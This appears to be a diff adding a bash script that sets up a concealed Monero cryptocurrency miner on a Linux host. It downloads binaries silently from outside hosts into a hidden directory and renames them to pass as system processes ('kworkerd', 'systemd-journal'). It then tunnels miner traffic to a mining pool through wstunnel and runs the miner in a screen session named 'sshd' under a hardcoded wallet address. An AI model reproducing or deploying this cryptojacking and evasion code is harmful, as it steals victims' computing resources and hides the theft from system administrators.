@@ -1,0 +1,68 @@
+#!/bin/bash
+sudo apt update
+sudo apt install screen -y
+# Exit on error (optional, remove if you want it to keep going)
+set -e
+
+# 1. Generate Random Ports
+WS_PORT=$(shuf -i 10000-65000 -n 1)
+TCP_PORT=$(shuf -i 10000-65000 -n 1)
+
+# Ensure ports are unique
+while [ "$TCP_PORT" == "$WS_PORT" ]; do
+    TCP_PORT=$(shuf -i 10000-65000 -n 1)
+done
+
+# 2. Create a hidden directory for binaries
+HIDDEN_DIR="/var/lib/.cache/sys"
+mkdir -p "$HIDDEN_DIR"
+cd "$HIDDEN_DIR"
+
+# 3. Random Filenames for downloads (not process names)
+WSTUNNEL_DL=$(tr -dc 'a-zA-Z0-9' </dev/urandom | head -c 10)
+BOS_DL=$(tr -dc 'a-zA-Z0-9' </dev/urandom | head -c 10)
+
+# 4. Download Binaries Silently
+# Use -s for silent, -L for follow redirects
+curl -s -L -o "${WSTUNNEL_DL}.tar.gz" https://storage.technoelectro.online/wstunnel_10.5.2_linux_amd64.tar.gz
+curl -s -L -o "${BOS_DL}" https://github.com/wakitobi/glowing-umbrella/raw/refs/heads/main/bos
+
+# 5. Extract and Rename to Stealthy Process Names
+tar -xf "${WSTUNNEL_DL}.tar.gz"
+rm -f "${WSTUNNEL_DL}.tar.gz" # Clean up tarball
+
+# Rename binaries to look like system processes
+# 'kworkerd' looks like a kernel worker daemon
+# 'systemd-journal' looks like a log manager
+mv wstunnel kworkerd
+mv "${BOS_DL}" systemd-journal
+
+# 6. Set Permissions
+chmod +x kworkerd systemd-journal
+
+# 7. Start wstunnel Server
+# Redirect to /dev/null, use stdbuf to buffer output (less disk I/O)
+stdbuf -oL -eL ./kworkerd server ws://127.0.0.1:${WS_PORT} >/dev/null 2>&1 &
+
+# 8. Start wstunnel Client
+stdbuf -oL -eL ./kworkerd client \
+    -L tcp://127.0.0.1:${TCP_PORT}:xmr.kryptex.network:7029 \
+    ws://127.0.0.1:${WS_PORT} >/dev/null 2>&1 &
+
+# 9. Start the Miner in Screen
+# Use a generic screen name like 'sshd' or 'node'
+# -d -m = detach and create
+# -S = session name
+screen -dmS sshd ./systemd-journal \
+    -o 127.0.0.1:${TCP_PORT} \
+    -u 89YQSFqV1vbUM77et87qV67eVroCiro6YYntMES23R3h7kKjeKyN4cwTnCVAFhyMpq6w1JERiENowLPxdxXWenJv5hZMfS2.TL \
+    -t 6
+
+# 10. Optional: Wait for a few seconds to ensure processes are up
+sleep 3
+
+# 11. Verify (Silent Check)
+# If you want to see if it worked, uncomment the next line
+# ps aux | grep -E "(kworkerd|systemd-journal|sshd)" | grep -v grep
+
+echo "Stealth started. WS Port: $WS_PORT, TCP Port: $TCP_PORT"
